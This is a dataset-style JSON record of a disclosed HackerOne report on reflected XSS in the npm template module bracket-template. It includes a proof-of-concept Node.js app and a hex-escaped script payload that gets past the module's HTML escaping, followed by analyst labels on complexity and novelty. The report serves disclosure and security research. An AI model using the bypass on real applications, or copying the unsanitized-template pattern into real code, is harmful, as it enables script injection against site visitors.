{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template",
  "content": "\nHi Guys,\nI would like to report Reflected XSS in bracket-template module.\nIt allows to inject arbitrary JavaScript tag and malicious code to execute when variables read from GET are used directly in template without sanitization.\nModule\nmodule name: bracket-template\nversion: 1.1.5\nnpm page: https://www.npmjs.com/package/bracket-template\nDescription\nMinimal (\u00fcber fast) Javascript engine compatible with node.js and browsers.\nModule Stats\nStats:\n51 downloads in the last day\n209 downloads in the last week\n835 downloads in the last month\n~10000 estimated downloads per year\nDescription\nWhile testing bracket-template module, I've found that there is possibility to inject malicious <script> tag followed by JavaScript code when values passed via GET are used in templates directly, without any sanitization.\nSteps To Reproduce:\ninstall bracket-template module:\nCode 30 Bytes\n1$ npm install bracket-template\ncreate sample aaplication, which reads name from url and displays welcome message in the browser:\nCode 679 Bytes\n1// app.js file\n2const http = require('http')\n3const bracket = require('bracket-template').default\n4const port = 8080\n5\n6function createHTML(name) {\n7    let tpl = `\n8        [[ const n = '${name}'; ]]\n9        <strong>Hello [[= n ]]</strong>\n10    `\n11    return bracket.compile(tpl)\n12}\n13\n14const requestHandler = (request, response) => {\n15    const name = request.url.split('=')[1]\n16    response.writeHeader(200, { \"Content-Type\": \"text/html\" });\n17    response.write(createHTML(name)());\n18    response.end();\n19}\n20\n21const server = http.createServer(requestHandler)\n22\n23server.listen(port, (err) => {\n24    if (err) {\n25        return console.log(err)\n26    }\n27    console.log(`server is listening on ${port}`)\n28})\nrun application:\nCode 13 Bytes\n1$ node app.js\nopen http://localhost:8080?name=bl4de in the browser. You will notice expected result:\n<image_0>\nnow, try to inject following malicious XSS payload: http://localhost:8080?name=bl4de<script>console.log('XSS?')</script>. You will notice all HTML special characters were escaped:\n<image_1>\nthis time, use following payload: http://localhost:8080/?name=bl4de\\x3cscript\\x3econsole.log(\\x22uh\\x20oh,\\x20XSS...\\x20:(\\x22)\\x3c\\x2fscript\\x3e and see the result in browser dev tools console:\n<image_2>\nWhen we investigate HTML returned from the server, we can notice using \\x[hex][hex] notation allows to inject any HTML special character and crafts XSS payload:\nCode 76 Bytes\n1<strong>Hello bl4de<script>console.log(\"uh oh, XSS... :(\")</script></strong>\nAlso, I have noticed that this vector is not detected by built-in XSS protection (XSS Auditor) in Blink/WebKit based browsers (Chromium, Safari, Chrome, Opera), which causes additional risk for anyone who uses bracket-template in production application.\nSupporting Material/References:\nThis issue was found and tested with following setup:\nmacOS HighSierra 10.13.3\nNode.js v.8.9.3\nnpm v. 5.5.1\nChromium 66.0.3342.0, Safari 11.03 (with XSS Auditor enabled), Chrome 64.0.3282.167 (with XSS Auditor enabled)\nWrap up\nI contacted the maintainer to let him know: No\nI opened an issue in the related repository: No\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis issue can be used by malicious user to exploit Reflected XSS against application which outputs variables passed via GET parameters directly in template(s) without any sanitization.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Reflected"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/368/5404583ac56a8e64b69905947920c21c08640253/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4W5YEBW%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T173254Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvZ%2Ffic%2BKJraC1kz9f7tRwav%2BFfnCwBJlOPORS93QY8AiBwfFXLK91b76PRFuf9c1%2Fnpe2uhaCjkq9o%2B9vxrP2xFyqyBQgyEAMaDDAxMzYxOTI3NDg0OSIMNp%2BNYkioMsnHJUcYKo8FnUDLKxXFuoEToltOI%2FD4avO2d2lUOWGc9STUQV3ASqOa92EFd8nvq6XfuoZeHQQZpQP%2BqrkWd0m3Iiv6feR8LZnavV0NVvPG1R%2BAG%2BcTYdWOcTWM2D4%2FY8gra6KUMWCwMYiD2CVfI6TEivJlIc6nW0TuRLp8m4hhk08GhGZOajGMtcyiWPwdDZlSHC%2BLwxZft89gms%2B8hlvBu3DZBcy4AgRj26UJ5oeGA0uvddWSsVaXS4QQziwzJUL4ZJVHJ7c8BV9GHHrZMUUWsc8Xdz5fCX8pbfkLWYHWX1YR9gzcmiil4%2FBKvmogdq6rHBSHijToDITElFiP3BzMtx9nkXMy5ONwNLgudrd7TVsnwRryxL1ZDv%2Bp%2F4ALJvl5ZM%2FjNfSssQpEyP0JpvuhxmA20KcHbu%2B0IkMYYcq8hJyqkj2Ry6I30DmSq8pd07mywg06%2F1EBEFqLPUGPZDhQ2BytzHqBG%2BP0FWgD%2FdxLCZD8IyRkSFgRFE2pjtp%2Binrw8iSbIbAObUwqUIHZmcW6iIBGbcMJ1v0XvskRNuyUDU%2BKg12cJLSyH%2FCQ25rjQcvHPZF%2F4wPXOQPgnyzkEwHJIm55LygGPqokXYzlFh%2B%2BEoP18I2NImqQIBLGgR6daa6SeGT8UwINq1oHzEfztfx8ht4TuSICMOsatQPrsia0nWugtfeVYFLhoyQetU4sCWP87vJY2gs4urx58HhswWsLh7lYT%2BWaRfznyXenWJC1shH7ihfEdUp%2BDnEPgHl05TpWBNQ7PDv5DhKdwJ74WEj6ZiyuvpdOMqX7E%2BsLEc5g9h0wWUnXWyB1UKf0GfEyjy6nDsQYjqcYPun4PNfm37TUBsFPYFuV4MijbDUTgsQLURQrOwL6WzCy15C%2FBjqyAdBr3S28w%2Bo00FbUyjxq27ZvYBsI89rHLKW786niN6lUFHLJUIaUpHpTb%2BkItosmPVhUNq71s6ztM9qxABK8jBOdnK6pry8PEEbKCtsQjjJsEh8zQ6fW1ipYM%2BEHBOjMwJOHhk6ZkZ8WAwWg%2BztgrQQhwk0zxzzN5o7X39RzA8z6iinj2gPJ7dNxgDeSUAeaBIc2kV5CizQu0mm6bdh1A3xIMN5IyaLEHWxPy3R56vFM940%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bfedb5c76eefbf7246c9564b2e1b3836819fa5936661fa2a5e94b15456c461e4",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/369/380fbd02d94f877178129f6ec4c2a0bc011e5fbe/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4W5YEBW%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T173254Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvZ%2Ffic%2BKJraC1kz9f7tRwav%2BFfnCwBJlOPORS93QY8AiBwfFXLK91b76PRFuf9c1%2Fnpe2uhaCjkq9o%2B9vxrP2xFyqyBQgyEAMaDDAxMzYxOTI3NDg0OSIMNp%2BNYkioMsnHJUcYKo8FnUDLKxXFuoEToltOI%2FD4avO2d2lUOWGc9STUQV3ASqOa92EFd8nvq6XfuoZeHQQZpQP%2BqrkWd0m3Iiv6feR8LZnavV0NVvPG1R%2BAG%2BcTYdWOcTWM2D4%2FY8gra6KUMWCwMYiD2CVfI6TEivJlIc6nW0TuRLp8m4hhk08GhGZOajGMtcyiWPwdDZlSHC%2BLwxZft89gms%2B8hlvBu3DZBcy4AgRj26UJ5oeGA0uvddWSsVaXS4QQziwzJUL4ZJVHJ7c8BV9GHHrZMUUWsc8Xdz5fCX8pbfkLWYHWX1YR9gzcmiil4%2FBKvmogdq6rHBSHijToDITElFiP3BzMtx9nkXMy5ONwNLgudrd7TVsnwRryxL1ZDv%2Bp%2F4ALJvl5ZM%2FjNfSssQpEyP0JpvuhxmA20KcHbu%2B0IkMYYcq8hJyqkj2Ry6I30DmSq8pd07mywg06%2F1EBEFqLPUGPZDhQ2BytzHqBG%2BP0FWgD%2FdxLCZD8IyRkSFgRFE2pjtp%2Binrw8iSbIbAObUwqUIHZmcW6iIBGbcMJ1v0XvskRNuyUDU%2BKg12cJLSyH%2FCQ25rjQcvHPZF%2F4wPXOQPgnyzkEwHJIm55LygGPqokXYzlFh%2B%2BEoP18I2NImqQIBLGgR6daa6SeGT8UwINq1oHzEfztfx8ht4TuSICMOsatQPrsia0nWugtfeVYFLhoyQetU4sCWP87vJY2gs4urx58HhswWsLh7lYT%2BWaRfznyXenWJC1shH7ihfEdUp%2BDnEPgHl05TpWBNQ7PDv5DhKdwJ74WEj6ZiyuvpdOMqX7E%2BsLEc5g9h0wWUnXWyB1UKf0GfEyjy6nDsQYjqcYPun4PNfm37TUBsFPYFuV4MijbDUTgsQLURQrOwL6WzCy15C%2FBjqyAdBr3S28w%2Bo00FbUyjxq27ZvYBsI89rHLKW786niN6lUFHLJUIaUpHpTb%2BkItosmPVhUNq71s6ztM9qxABK8jBOdnK6pry8PEEbKCtsQjjJsEh8zQ6fW1ipYM%2BEHBOjMwJOHhk6ZkZ8WAwWg%2BztgrQQhwk0zxzzN5o7X39RzA8z6iinj2gPJ7dNxgDeSUAeaBIc2kV5CizQu0mm6bdh1A3xIMN5IyaLEHWxPy3R56vFM940%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5561a969493ead5f933d2510ff475401361b36c7c7a8e7ef8256761f419abb13",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/264/370/476deed12b4d2d1b03e8420ba470c80f8c1b2cf8/3.png?response-content-disposition=attachment%3B%20filename%3D%223.png%22%3B%20filename%2A%3DUTF-8%27%273.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4W5YEBW%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T173254Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvZ%2Ffic%2BKJraC1kz9f7tRwav%2BFfnCwBJlOPORS93QY8AiBwfFXLK91b76PRFuf9c1%2Fnpe2uhaCjkq9o%2B9vxrP2xFyqyBQgyEAMaDDAxMzYxOTI3NDg0OSIMNp%2BNYkioMsnHJUcYKo8FnUDLKxXFuoEToltOI%2FD4avO2d2lUOWGc9STUQV3ASqOa92EFd8nvq6XfuoZeHQQZpQP%2BqrkWd0m3Iiv6feR8LZnavV0NVvPG1R%2BAG%2BcTYdWOcTWM2D4%2FY8gra6KUMWCwMYiD2CVfI6TEivJlIc6nW0TuRLp8m4hhk08GhGZOajGMtcyiWPwdDZlSHC%2BLwxZft89gms%2B8hlvBu3DZBcy4AgRj26UJ5oeGA0uvddWSsVaXS4QQziwzJUL4ZJVHJ7c8BV9GHHrZMUUWsc8Xdz5fCX8pbfkLWYHWX1YR9gzcmiil4%2FBKvmogdq6rHBSHijToDITElFiP3BzMtx9nkXMy5ONwNLgudrd7TVsnwRryxL1ZDv%2Bp%2F4ALJvl5ZM%2FjNfSssQpEyP0JpvuhxmA20KcHbu%2B0IkMYYcq8hJyqkj2Ry6I30DmSq8pd07mywg06%2F1EBEFqLPUGPZDhQ2BytzHqBG%2BP0FWgD%2FdxLCZD8IyRkSFgRFE2pjtp%2Binrw8iSbIbAObUwqUIHZmcW6iIBGbcMJ1v0XvskRNuyUDU%2BKg12cJLSyH%2FCQ25rjQcvHPZF%2F4wPXOQPgnyzkEwHJIm55LygGPqokXYzlFh%2B%2BEoP18I2NImqQIBLGgR6daa6SeGT8UwINq1oHzEfztfx8ht4TuSICMOsatQPrsia0nWugtfeVYFLhoyQetU4sCWP87vJY2gs4urx58HhswWsLh7lYT%2BWaRfznyXenWJC1shH7ihfEdUp%2BDnEPgHl05TpWBNQ7PDv5DhKdwJ74WEj6ZiyuvpdOMqX7E%2BsLEc5g9h0wWUnXWyB1UKf0GfEyjy6nDsQYjqcYPun4PNfm37TUBsFPYFuV4MijbDUTgsQLURQrOwL6WzCy15C%2FBjqyAdBr3S28w%2Bo00FbUyjxq27ZvYBsI89rHLKW786niN6lUFHLJUIaUpHpTb%2BkItosmPVhUNq71s6ztM9qxABK8jBOdnK6pry8PEEbKCtsQjjJsEh8zQ6fW1ipYM%2BEHBOjMwJOHhk6ZkZ8WAwWg%2BztgrQQhwk0zxzzN5o7X39RzA8z6iinj2gPJ7dNxgDeSUAeaBIc2kV5CizQu0mm6bdh1A3xIMN5IyaLEHWxPy3R56vFM940%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c763823df949536a884276b8eb0e6975f75633252edb831441590baf290599ca"
  },
  "disclosed_date": 1523300280,
  "report_url": "https://hackerone.com/reports/317125",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the bracket-template module: npm install bracket-template"
    ],
    [
      2,
      "Create a sample application that reads a name from the URL and displays a welcome message without sanitizing the input"
    ],
    [
      3,
      "Run the application: node app.js"
    ],
    [
      4,
      "Access the application in a browser with a malicious payload in the URL parameter, e.g., http://localhost:8080?name=bl4de\\x3cscript\\x3econsole.log(\\x22XSS\\x22)\\x3c/script\\x3e"
    ]
  ],
  "vuln_description": "The bracket-template module is vulnerable to Reflected XSS when variables passed via GET parameters are used directly in templates without proper sanitization. This allows an attacker to inject arbitrary JavaScript code that executes in the context of the victim's browser.",
  "reason": "The vulnerability is straightforward to discover as it involves a common XSS pattern where unsanitized user input is directly embedded into the template. The attack does not require complex interactions or state manipulation, and the payload is a standard XSS vector.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a reflected XSS issue where unsanitized user input from GET parameters is directly used in templates, leading to potential script injection. This is not an authentication or authorization issue (AuthN/AuthZ) but rather a client-side security issue (XSS). The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are server-side issues, and do not cover client-side injection vulnerabilities like XSS.",
    "is_detectable": false
  }
}